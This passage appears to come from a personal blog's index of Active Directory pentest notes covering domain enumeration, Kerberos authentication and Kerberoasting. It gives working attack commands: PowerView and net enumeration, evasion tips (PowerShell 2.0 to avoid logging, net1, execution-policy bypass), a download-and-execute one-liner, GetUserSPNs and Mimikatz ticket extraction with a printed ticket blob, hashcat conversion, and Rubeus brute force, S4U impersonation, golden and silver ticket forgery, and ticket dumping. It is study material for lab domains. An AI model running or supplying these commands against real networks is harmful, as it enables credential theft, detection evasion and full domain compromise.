AD object for the current (or specified) domain Get-DomainController Return a list of the Domain Controllers for the specified domain Get-DomainUser Will return all users or specific user objects in AD Get-DomainComputer Will return all computers or specific computer objects in AD Get-DomainGroup Will return all groups or specific group objects in AD Get-DomainOU Search for all or specific OU objects in AD Find-InterestingDomainAcl Finds object ACLs in the domain with modification rights set to non-built in objects Get-DomainGroupMember Will return the members of a specific domain group Get-DomainFileServer Returns a list of servers likely functioning as file servers Get-DomainDFSShare Returns a list of all distributed file systems for the current (or specified) domain GPO Functions: Get-DomainGPO Will return all GPOs or specific GPO objects in AD Get-DomainPolicy Returns the default domain policy or the domain controller policy for the current domain Computer Enumeration Functions: Get-NetLocalGroup Enumerates local groups on the local or a remote machine Get-NetLocalGroupMember Enumerates members of a specific local group Get-NetShare Returns open shares on the local (or a remote) machine Get-NetSession Will return session information for the local (or a remote) machine Test-AdminAccess Tests if the current user has administrative access to the local (or a remote) machine Threaded \u0026lsquo;Meta\u0026rsquo;-Functions Find-DomainUserLocation Finds machines where specific users are logged in Find-DomainShare Finds reachable shares on domain machines Find-InterestingDomainShareFile Searches for files matching specific criteria on readable shares in the domain Find-LocalAdminAccess Find machines on the local domain where the current user has local administrator access Domain Trust Functions Get-DomainTrust Returns domain trusts for the current domain or a specified domain Get-ForestTrust Returns all forest trusts for the current forest or a specified forest Get-DomainForeignUser Enumerates users who are in groups outside of the user\u0026rsquo;s domain Get-DomainForeignGroupMember Enumerates groups with users outside of the group\u0026rsquo;s domain and returns each foreign member Get-DomainTrustMapping Will enumerate all trusts for the current domain and any others seen. Domain User Info\nGet-DomainUser -Identity morgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname, description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol\nRecursive Group Membership\nGet-DomainGroupMember -Identity \u0026quot;Domain Admins\u0026quot; -Recurse - retrieve group-specific information and recurse which means if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups.\nTrust Enumeration.\nGet-DomainTrustMapping test for local admin access on either the current machine or the remote one.\nTesting for Local Admin Access\nTest-AdminAccess -ComputerName ACADEMY-EA-MS01\nUsers with SPN Set\nGet-DomainUser -SPN -Properties samaccountname,ServicePrincipalName\nShares Allows users on the domain to quickly access info relevant to their daily roles and share content with their organization.\nSnaffler A tool that helps in acquiring credentials or other sensitive data in AD, works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.\nLiving off the Land Discussion on Techniques for utilizing native Windows tools to perform our enumeration is considered a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network.\nMost enterprise environments have network monitoring and logging, including IDS/IPS, firewalls and passive sensors and tools on top of their host-based defences Windows Defender or enterprise EDR.\nEnv Enumeration Host \u0026amp; Network Recon Command Result hostname Prints the PC\u0026rsquo;s Name [System.Environment]::OSVersion.Version Prints out the OS version and revision level wmic qfe get Caption,Description,HotFixID,InstalledOn Prints the patches and hotfixes applied to the host ipconfig /all Prints out network adapter state and configurations set %USERDOMAIN% Displays the domain name to which the host belongs (ran from CMD-prompt) set %logonserver% Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) Powershell It provides an extensive framework for administering all facets of Windows systems and AD Environments, can be used to dig deep into systems and can be used on engagements to recon the host and network and send and receive files.\nCmd-Let Description Get-Module Lists available modules loaded for use. Get-ExecutionPolicy -List Will print the https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2 settings for each scope on a host. Set-ExecutionPolicy Bypass -Scope Process This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won\u0026rsquo;t be making a permanent change to the victim host. Get-Content C:\\Users\u0026lt;USERNAME\u0026gt;\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt With this string, we can get the specified user\u0026rsquo;s PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. Get-ChildItem Env: ft Key, Value powershell -nop -c \u0026ldquo;iex(New-Object Net.WebClient).DownloadString(\u0026lsquo;URL to download the file from\u0026rsquo;); \u0026rdquo; This is a quick and easy way to download a file from the web using PowerShell and call it from memory. OPSec Tactics A few Operational security tactics that defenders are unaware of are that several versions of Powershell often exist on a host. If not uninstalled, they can still be used.\nExample Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders\u0026rsquo; radar while utilizing resources built into the hosts to our advantage.\nChecking Defenses. These few commands will utilize the netsh and sc to help get an understanding of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.\nFirewall check - netsh advfirewall show allprofiles\nDefender check cmd - sc query windefend\nChecking the status and configuration settings - Get-MpComputerStatus\nAm I Alone? When landing on a host for the first time, it\u0026rsquo;s important to check and see if you are the only one logged in since if you take certain actions from a host someone else is logged on, there is potential for them to identify you.\nIf a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.\nNetwork Enumeration Networking Commands Description arp -a Lists all known hosts stored in the arp table. ipconfig /all Prints out adapter settings for the host. We can figure out the network segment from here. route print Displays the routing table (IPv4 \u0026amp; IPv6) identifying known networks and layer three routes shared with the host. netsh advfirewall shows state Displays the status of the host\u0026rsquo;s firewall. We can determine if it is active and filtering traffic. Windows Management Instrumentation (WMI) This scripting engine is used within Windows enterprises to retrieve info and run admin tasks on local and remote hosts.\nQuick WMI checks\nCommand Description wmic qfe get Caption,Description,HotFixID,InstalledOn Prints the patch level and description of the Hotfixes applied wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List Displays basic host information to include any attributes within the list wmic process list /format:list A listing of all processes on host wmic ntdomain list /format:list Displays information about the Domain and Domain Controllers wmic useraccount list /format:list Displays information about all local accounts and any domain accounts that have logged into the device wmic group list /format:list Information about all local groups wmic sysaccount list /format:list Dumps information about any system accounts that are being used as service accounts. This cheatsheet has some useful commands for querying host and domain info using wmic.\nNet Commands Are useful when enumerating information from the domain, these commands can be used to query the [localhost] and remote hosts.\nCommand Description net accounts Information about password requirements net accounts /domain Password and lockout policy net group /domain Information about domain groups net group \u0026ldquo;Domain Admins\u0026rdquo; /domain List users with domain admin privileges net group \u0026ldquo;domain computers\u0026rdquo; /domain List of PCs connected to the domain net group \u0026ldquo;Domain Controllers\u0026rdquo; /domain List PC accounts of domains controllers net group \u0026lt;domain_group_name\u0026gt; /domain User that belongs to the group net groups /domain List of domain groups net localgroup All available groups net localgroup administrators /domain List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) net localgroup Administrators Information about a group (admins) net localgroup administrators [username] /add Add user to administrators net share Check current shares net user \u0026lt;ACCOUNT_NAME\u0026gt; /domain Get information about a user within the domain net user /domain List all users of the domain net user %username% Information about the current user net use x: \\computer\\share Mount the share locally net view Get a list of computers net view /all /domain[:domainname] Shares on the domains net view \\computer /ALL List shares of a computer net view /domain List of PCs of the domain Net Command Tip. If you are in an environment where network defenders are actively logging/looking for any commands out of the normal you can try typing net1 instead of the net to work out using the net command.\nDsquery A command-line tool that can be used to find Active Directory objects, the queries run with dsquery can be replicated with Bloodhound and Powerview, but one may not have access to those tools.\nDsquery will exist on any host with the Active Directory Domain Services Role installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at C:\\Windows\\System32\\dsquery.dll\nA long read but worthy to check up on those commands one might not remember \u0026hellip;\n","permalink":"http://localhost:1313/posts/active-directory/ad-credential-enumeration/","summary":"Credential Enumeration After acquiring a foothold, you must dig deeper using the low-privilege domain user credentials. Information to be interested in when enumerating:\nDomain users Computer Attributes group membership Group Policy Objects Permissions ACLs Trusts but not limited to the above, but the most important thing to remember is that most of these tools will not work without domain users’ credentials at any permission level.\nSo at a minimum, you need to have acquired a user’s cleartext password, NTLM password hash or SYSTEM access on a domain-joined host.","title":"AD CRED ENUM"},{"content":" Kerberoasting The Kerberos protocol defines how clients interact with a network authentication service, clients obtain tickets from the Kerberos Key Distribution Center (KDC) and they submit these tickets to application servers when connections are established. uses port 88 by default and depends on the process of symmetric key cryptography.\nNB [kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network]\nHow Kerb Auth works! In every Active Directory domain, every domain controller runs a KDC service that provides requests for tickets to kerberos, which is the KRBTGT account in the AD domain.\nKerberos uses symmetric cryptography for encryption and decryption.\nFor explanation purposes, we use three colours to distinguish Hashes:\nBLUE _KEY: User NTLM HASH YELLOW_KEY: Krbtgt NTLM HASH RED_KEY: Service NTLM HASH Step 1: By sending the request message to KDC, the client initializes communication as:\nKRB_AS_REQ contains the following:\nThe username of the client is to be authenticated. The service SPN (SERVICE PRINCIPAL NAME) linked with the Krbtgt account An encrypted timestamp (Locked with User Hash: Blue Key) The entire message is encrypted using the User NTLM hash (Locked with BLUE KEY) to authenticate the user and prevent replay attacks.\nStep 2: The KDC uses a database consisting of Users/Krbtgt/Services hashes to decrypt a message (Unlock with BLUE KEY) that authenticates user identification.\nThen KDC will generate TGT (Ticket Granting Ticket) for a client that is encrypted using Krbtgt hash (Locked with Yellow Key) \u0026amp; some Encrypted Message using User Hash.\nKRB_AS_REP contains the following:\nUsername Some encrypted data, (Locked with User Hash: Blue Key) that contains: Session key The expiration date of TGT TGT, (Locked with Krbtgt Hash: Yellow Key) which contains: Username Session key The expiration date of TGT PAC with user privileges, signed by KDC Step 3: The KRB_TGT will be stored in the Kerberos tray (Memory) of the client machine, as the user already has the KRB_TGT, which is used to identify himself for the TGS request. The client sent a copy of the TGT with the encrypted data to KDC.\nKRB_TGS_REQ contains:\nEncrypted data with the session key Username Timestamp TGT SPN of requested service e.g. SQL service Step 4: The KDC receives the KRB_TGS_REQ message and decrypts the message using Krbtgt hash to verify TGT (Unlock using Yellow key), then KDC returns a TGS as KRB_TGS_REP which is encrypted using requested service hash (Locked with Red Key) \u0026amp; Some Encrypted Message using User Hash.\nKRB_TGS_REP contains:\nUsername Encrypted data with the session key: Service session key The expiration date of TGS TGS, (Service Hash: RED Key) which contains: Service session key Username The expiration date of TGS PAC with user privileges, signed by KDC Step 5: The user sends the copy of TGS to the Application Server,\nKRB_AP_REQ contains:\nTGS Encrypted data with the service session key: Username Timestamp, to avoid replay attacks Step 6: The application attempts to decrypt the message using its NTLM hash and to verify the PAC from KDC to identify user Privilege which is an optional case.\nStep 7: KDC verifies PAC (Optional)\nStep 8: Allow the user to access the service for a specific time.\nSPNs The Service Principal Name (SPN) is a unique identifier for a service instance. Active Directory Domain Services and Windows provide support for Service Principal Names (SPNs), which are key components of the Kerberos mechanism through which a client authenticates a service.\nImportant Points\nIf you install multiple instances of a service on computers throughout a forest, each instance must have its SPN. Before the Kerberos authentication service can use an SPN to authenticate a service, the SPN must be registered on the account. A given SPN can be registered on only one account. An SPN must be unique in the forest in which it is registered. If it is not unique, authentication will fail. SPNS syntax The SPN syntax has four elements\nType of SPN Host-based SPNs which is associated with the computer account in AD, it is randomly generated 128-character long password which is changed every 30 days; hence it is no use in Kerberoasting attacks SPNs that have been associated with a domain user account where NTLM hash will be used. Linux Perspective Attack Procedure. Depending on your positioning a network, Kerberos attacks can be performed in multiple ways.\nFrom a non-domain joined Linux host using valid domain user credentials. From a domain-joined Linux host as root after retrieving the keytab file. From a domain-joined Windows, the host is authenticated as a domain user. From a domain-joined Windows host with a shell in the context of a domain account. As SYSTEM on a domain-joined Windows host. From a non-domain joined Windows host using runas /netonly. Tools. Some tools can be utilized to perform the attack.\nImpacket’s GetUserSPNs.py from a non-domain joined Linux host. A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz. From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts. REMEMBER!!!\nObtaining a TGS ticket via kerberoasting does not guarantee a set of valid credentials and the ticket still must be cracked offline to obtain the cleartext password.\nTGS tickets generally take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using s standard cracking rig.\nThe efficiency of Attack While it can be a great way to move lateral or escalate privileges in a domain kerberoasting and the presence of SPNs does not guarantee us any level of access.\nWe might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access.\nN/B - When writing a report this finding is termed as high-risk in the first two cases. Third case we may Kerberos and end up unable to crack a single TGS ticket even after mad days of cracking attempts with Hashcat. This would be dropped as a medium-risk issue to make the client aware of the risk of SPNs in the domain.\nREMEMBER!!!\nA prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.\nGetUserSPNs.py Listing SPN Accounts.\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend\nRequesting all TGS tickets.** Later on, we can pull all TGS tickets for offline processing using the -request flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or Johnny for offline password-cracking attempts.\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request\nRequesting a Single TGS Ticket. Wte can also be more targeted and request just the TGS ticket for a specific account. Let\u0026rsquo;s try requesting one for just the required account.\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user\nWith this ticket in hand, we could attempt, to crack the password offline, if successful we may end up with Domain Admin Rights.\nSaving the Ticket o facilitate offline cracking, it is always good to use the -outputfile flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.\nGetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs\nWindows Perspective Kerberoasting - Semi-Manual Method.\nEnumerating SPNs with setspn.exe setspn.exe -Q */* running the command you’ll notice many different SPNs returned for the various hosts in the domain.\nRetrieving All Tickets using setspn.exe setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }\nThe above command combines the previous command with setspn.exe to request tickets for all accounts with SPNs set.\nUsing Powershell we can request TGS tickets for an account in the shell and load them into memory, once they are loaded into memory we can extract them using Mimkatz.\nTargeting a Single User************** PS C:\\htb\u0026gt; Add-Type -AssemblyName System.IdentityModel PS C:\\htb\u0026gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \u0026#34;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\u0026#34; Before moving on, let\u0026rsquo;s break down the commands above to see what we are doing (which is essentially what is used by Rubeus when using the default Kerberoasting method):\nThe Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object The AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using System.IdentityModel is a namespace that contains different classes for building security token services We\u0026rsquo;ll then use the New-Object cmdlet to create an instance of a .NET Framework object We\u0026rsquo;ll use the System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.\nNow that the tickets are loaded, we can use Mimikatz to extract the ticket(s) from memory.\nExtracting Tickets from Memory with Mimikatz Using \u0026#39;mimikatz.log\u0026#39; for logfile : OK mimikatz # base64 /out:true isBase64InterceptInput is false isBase64InterceptOutput is true mimikatz # kerberos::list /export \u0026lt;SNIP\u0026gt; [00000002] - 0x00000017 - rc4_hmac_nt Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM Server Name: MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL Client Name: htb-student @ INLANEFREIGHT.LOCAL Flags 40a10000 : name_canonicalize ; pre_authent ; renewable ; forwardable ; ==================== Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi ==================== 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 ZWZyZWlnaHQubG9jYWw6MTQzMw== ==================== * Saved to file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi If we don’t specify the base64 /out:true command, Mimikatz will extract the tickets and write the to .kirbi files.\nNext, you prepare the base blob for cracking echo \u0026quot;\u0026lt;base64 blob\u0026gt;\u0026quot; | tr -d \\\\n then place the above into a file and convert it back to a .kirbi file using the base64 utility.cat encoded_file | base64 -d \u0026gt; sqldev.kirbi\nExtract the kerberos ticket using kirbi2john.py this will create a file called crack_file, which then must be modified to be able to use Hashcat against the hash python2.7 kirbi2john.py sqldev.kirbi\nModifying the crack file for hashcat sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file \u0026gt; sqldev_tgs_hashcat now you can run the ticket through hashcat and get a clear password.\nSkipped Version So if we decide to skip the base64 output with mimkatz and type mimikatz # kerberos::list /export, the .kirbi file will be written to disk, in this case, you can download the file and run kirbi2john.py against them directly, skipping the base64 decoding step.\nAUTOMATE VERSION Using PowerView to extract the TGS ticket and convert them to Hashcat format.\nExtracting TGS Ticket\nPS C:\\htb\u0026gt; Import-Module .\\PowerView.ps1 PS C:\\htb\u0026gt; Get-DomainUser * -spn | select samaccountname PS C:\\htb\u0026gt; Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat Target Specific User\nGet-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\nExporting All Tickets to a CSV file and viewing the Content\nGet-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation\ncat .\\ilfreight_tgs.csv\nREBEUS https://github.com/GhostPack/Rubeus\nA tool capable of performing kerberoasting faster and easier by providing a variety of options to interact with kerberos\nhttps://www.hackingarticles.in/a-detailed-guide-on-rubeus/\nTicket Operations Working in an Active Directory environment depends on various tickets. For example, a Ticket Granting Ticket is an authentication token issued by the KDC which is used to request access from TGS for specific resources.\nIn this section, we’ll talk about Rubeus and its capability to play around with tickets.\nAsktgt Rubeus can generate raw AS-REQ traffic in order to ask for a TGT with a provided username and password. The password can also be encrypted in RC4, AES or DES encryption and it would still work. Let’s see an example where a clear-text password is supplied\nrubeus.exe asktgt /user:harshitrajpal /password: Password@1\nAs you can see above that a KRBTGT has been successfully generated which can be further used to generate TGS. The same can be achieved by providing an encrypted password. Let’s use a password encrypted with the RC4 cipher.\nrubeus.exe asktgt /user:harshitrajpal /rc4:64FBAE31CC352FC26AF97CBDEF151E03\nAsktgs\nRubeus has an asktgs option which can build raw TGS-REP requests by providing a ticket either in the CLI argument or by providing a path to a ticket.kirbi file placed on disk. Each TGS has a specified purpose.\nFor example, let’s create a TGS for the LDAP service. One or more service SPNs can be provided.\nrubeus.exe asktgs /user:harshitrajpal /ticket:doIFNDCCBTCgAwIBB...bA== /service:LDAP/dc1.ignite.local By providing in the TGT we generated in the previous step (copying in notepad and removing enters to type the ticket in a single line) we have generated a TGS successfully.\nKlist Klist command in Windows can be used to view the tickets generated in the system. Here, when we run klist command we can see that a KRBTGT and an LDAP TGS have been generated and stored in the session.\nRenew The renew function in Rubeus builds a TGT renewal exchange. We can specify a domain controller using the /dc flag which will be used as a destination for the renewal traffic. We can further use the tgtdeleg option with this and extract user’s credentials without elevation and keep it alive on another system for a week by default.\n/ptt flag can also be used in conjunction to apply the Kerberos\nrubeus.exe renew /dc:dc1.ignite.local /ticket:doIFNDCCB....bA==\n/autorenew sub-function will put the exchange to sleep for endTime 30 minutes and after that window automatically renew the TGT and display the renewed ticket\nrubeus.exe renew /dc:dc1.ignite.local /autorenew /ticket:doIFNDCCBTCgAw...bA==\nAs you may now observe that after a specified time interval a renewed TGT is shown\nBrute\nThe brute option in Rubeus can be used to perform a password bruteforce attack against all the existing user accounts in Active Directory. Many times, the same password is used with multiple accounts in real-life enterprise infrastructure. So, brute option can generate multiple TGTs in those accounts having the same password. /noticket can be used in conjunction with this option since no ticket is provided with this functionality. For example,\nrubeus.exe brute /password:Password@1 /noticket\nHash\nRubeus is capable of taking in passwords and generating hashes of them. These are of different formats including NTLM (rc4_hmac) hash. To do this, we can use a hash function and provide a domain using /domain, an account’s name (can be a machine account too) using the/user flag and the password using /password.\nrubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1\nAs you can see 4 different hashes have been output. Various encryption ciphers are used in conjunction with popular hashing techniques. All of these ciphers are supported in AD environment and hence, may be used for different purposes.\nS4u\nWe saw above how we can generate hashes using Rubeus. Now let’s talk about one such attack where hashes can be used to impersonate another user and carry out delegation attacks. For a detailed write-up on delegation, and attacks follow the link here. In short, OS post-Windows server 2003 contained a Kerberos protocol extension called s4uself and s4uproxy. These protocols can be used to conduct delegation attacks. For example, in the example below, we have performed an attack called “Resource-Based Constrained Delegation” which benefits the msDS-AllowedToActOnBehalfOfAnotherIdentity option set in the attribute’s editor. Follow the article here for a full attack. In the example below, we’ll use the user noob’s hash and then impersonate Administrator account.\n/rc4: flag is used to provide user noob’s account.\n/impersonateuser: User that will be impersonated by noob.\n/msdsspn: A valid msDS-AllowedToActOnBehalfOfAnotherIdentity value for the account. Here, the domain controller\n/altservice: can be supplied to substitute one or more service names in the resulting .kirbi file.\n/ptt: Injects the resulting ticket in the current terminal session\nrubeus.exe s4u /user:noob$ /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /impersonateuser:Administrator /msdsspn:host/dc1.ignite.local /altservice:cifs /domain:ignite.local /ptt\nThis would generate a ticket for Administrator user over the specified SPN. In short, we can now act as DC.\nGolden Ticket Golden tickets are forged KRBTGTs (Key Distribution Service account) which can be used to forge other TGTs. This provides an attacker persistence over the domain accounts. For a detailed walkthrough on the topic you can visit the article here.\nTo forge a golden ticket for user harshitrajpal, we first generate an AES hash (RC4 works too) using the hash command in Rubeus and then using the golden function like so. Here,\n/ldap: Retrieves information of user over LDAP protocol\n/user: Username whose ticket will be forged\n/printcmd: displays a one liner command that can be used to generate the ticket again that just got generated\nrubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1\nrubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:harshitrajpal /printcmd\nAs you can see various details like SID, userID, Service Key etc are being fetched over LDAP which are important to generate a ticket. PAC signing is also done and a TGT generated for harshitrajpal\nAlso, at the end you’ll see a one liner command that can be used to generate this TGT again.\nVarious other options can be used in conjunction with golden to modify the generated TGT like:\n/rangeinterval: After every time specified, a new ticket will be generated.\n/rangeend: Specifies the maximum time tickets will be generated for. Here, 5 days. Since rangeinterval is 1d, 5 different tickets will be generated.\nFor a full list of modifications, see this page.\nSilver Ticket Silver tickets are forged Kerberos Ticket Granting Service (TGS) Tickets but with silver tickets there is no communication with the domain controller. It is signed by the service account configured with an SPN for each server the Kerberos-authenticating service runs on. For more details visit the page here.\nSilver ticket attack can be performed using Rubeus using silver function. Other customisations need be made like:\n/service: SPN of the service ticket is being generated for\n/rc4: Hash of a valid user (harshitrajpal here) which will be used to encrypt the generated ticket\n/user: username of the user whose hash is provided\n/creduser: User to be impersonated\n/credpassword: Password of the user to be impersonated\n/krbkey: used to create the KDCChecksum and TicketChecksum. This is the AES256 hmac sha1 hash in the following case.\n/krbenctype: type of encrypted hash used. Aes256 here.\nrubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1\nrubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt\nThis helped us generate a silver ticker for Administrator account. And as a result, we are now able to access DC machine’s C drive\ndir \\\\dc1.ignite.local\\c$ Ticket Management Rubeus contains multiple ticket management options that may aid a pentester to conduct operations effectively and stealthily. As a pentester, we need to manage our generated tickets.\nPtt\nThe Rubeus ptt option can import the supplied ticket in command line. The /ptt can also be used in conjunction with other options that output tickets. For example,\nrubeus.exe ptt /ticket:doIFNDCCBTCgAwI...bA==\nAs you can see, the generated ticket has now been imported.\nPurge\nRubeus has a purge option which can purge/delete all the tickets existing in the current session.\nHere, we demonstrate how we purged 2 tickets listed by klist.\nrubeus.exe purge\nDescribe\nOften we lose track of the tickets in system. Describe option helps us to view details about a particular base64 encrypted blob or ticket.kirbi file.\nWe can provide the ticket using /ticket flag.\nrubeus.exe describe /ticket:doIFNDCCBTCg...bA==\nTriage\nWhile klist views tickets for current session triage lists all the tickets. When a session is being run as an administrator, we can not only view tickets in the current user’s session memory but other user’s tickets in memory too.\n/luid: This flag can be used to provide a specific user ID. rubeus.exe triage rubeus.exe triage /luid:*0x8f57c*\nAlso, when the LUID is known, we can purge particular user’s tickets too (elevated mode only)\nrubeus.exe purge /luid:*0x8f57c*\nDump\nIf the session is running in an elevated mode, a user can dump/ extract all the current TGTs and service tickets. Again, /luid can be provided to dump specific user’s tickets. /service can be used to filter these tickets.\nFor example, /service:krbtgt displays only TGTs.\nrubeus.exe dump\nNext part I\u0026rsquo;ll work on the mitigation bit as it\u0026rsquo;s own unit hope you learnt a few bit on the read \u0026hellip; 😊\n","permalink":"http://localhost:1313/posts/active-directory/kerberos-101/","summary":"Kerberoasting The Kerberos protocol defines how clients interact with a network authentication service, clients obtain tickets from the Kerberos Key Distribution Center 